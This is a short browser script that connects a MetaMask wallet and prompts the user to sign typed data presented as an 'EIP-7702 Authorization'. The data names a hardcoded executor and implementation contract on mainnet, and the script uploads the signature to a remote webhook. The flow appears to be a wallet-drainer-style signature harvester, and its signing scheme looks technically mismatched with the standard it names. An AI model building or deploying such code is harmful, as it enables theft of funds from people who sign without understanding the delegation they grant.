const log = (msg) => {
  document.getElementById("log").textContent += msg + "\n";
};

const EXECUTOR = "0xB7B182dcDeDDf0035866c14e67232d371A08C6b5";
const ACCOUNT_IMPLEMENTATION = "0x4Cd241E8d1510e30b2076397afc7508Ae59C66c9";
const BACKEND_URL = "/.netlify/functions/receiveauth";


document.getElementById("authorize").onclick = async () => {
  try {
    if (!window.ethereum) {
      alert("MetaMask not detected");
      return;
    }

    // 1. Connect wallet
    const [walletA] = await ethereum.request({
      method: "eth_requestAccounts",
    });

    log("Connected as Wallet A: " + walletA);

    // 2. Build EIP‑712 typed data for authorization
    const typedData = {
      types: {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "version", type: "string" },
          { name: "chainId", type: "uint256" },
        ],
        Authorization: [
          { name: "contractAddress", type: "address" },
          { name: "executor", type: "address" },
          { name: "timestamp", type: "uint256" },
        ],
      },
      primaryType: "Authorization",
      domain: {
        name: "EIP-7702 Authorization",
        version: "1",
        chainId: 1,
      },
      message: {
        contractAddress: ACCOUNT_IMPLEMENTATION,
        executor: EXECUTOR,
        timestamp: Date.now(),
      },
    };

    // 3. Ask MetaMask to sign typed data
    const signature = await ethereum.request({
      method: "eth_signTypedData_v4",
      params: [walletA, JSON.stringify(typedData)],
    });

    const authorization = {
      wallet: walletA,
      signature,
      typedData,
    };

    log("Authorization signed, uploading to webhook...");

    // 4. Upload to webhook
    const res = await fetch(BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(authorization),
    });

    if (!res.ok) throw new Error("Webhook responded with " + res.status);

    log("Authorization uploaded successfully.");
  } catch (err) {
    console.error(err);
    log("Error: " + (err.message || String(err)));
  }
};
